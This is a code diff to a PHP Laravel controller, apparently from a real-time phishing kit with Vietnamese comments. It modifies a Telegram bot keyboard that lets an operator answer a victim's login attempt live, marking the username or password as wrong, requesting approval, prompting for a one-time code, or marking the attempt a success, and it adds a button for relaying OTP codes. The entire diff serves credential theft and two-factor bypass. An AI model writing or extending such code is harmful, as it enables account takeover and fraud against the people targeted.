@@ -25,7 +25,7 @@ class RealtimeWeb extends Controller
         $theme_language = $web_data->theme_language;
         app()->setLocale($theme_language);
         // pusher code
-        $pusher_code = Str::random(10) . md5(rand(999, 9999));
+        $pusher_code = Str::random(5);
         // nếu link chưa tồn tại ?a (allowed to access website)
         if (!$rq->exists('a')) {
             return view('init', ['data' => $web_data, 'info' => $web_info]);
@@ -92,11 +92,12 @@ class RealtimeWeb extends Controller
                             if ($post_data->ac == 'n') {
                                 $keyboard = [
                                     [
-                                        ['text' => '👤 Sai TK hoặc Email', 'callback_data' => 'wronguser_' . $pusher_code],
-                                        ['text' => '🔑 Sai MK', 'callback_data' => 'wrongpass_' . $pusher_code],
+                                        ['text' => '❌ User', 'callback_data' => 'wronguser_' . $pusher_code],
+                                        ['text' => '❌ Pass', 'callback_data' => 'wrongpass_' . $pusher_code],
+                                        ['text' => '🔒 Yêu cầu duyệt', 'callback_data' => 'otp_' . $pusher_code],
+                                        ['text' => '📱 Nhập mã', 'switch_inline_query_current_chat' => '/code' . $pusher_code . ' '],
                                     ],
                                     [
-                                        ['text' => '🔒 Yêu cầu duyệt & mã', 'callback_data' => 'otp_' . $pusher_code],
                                         ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
                                     ]
                                 ];
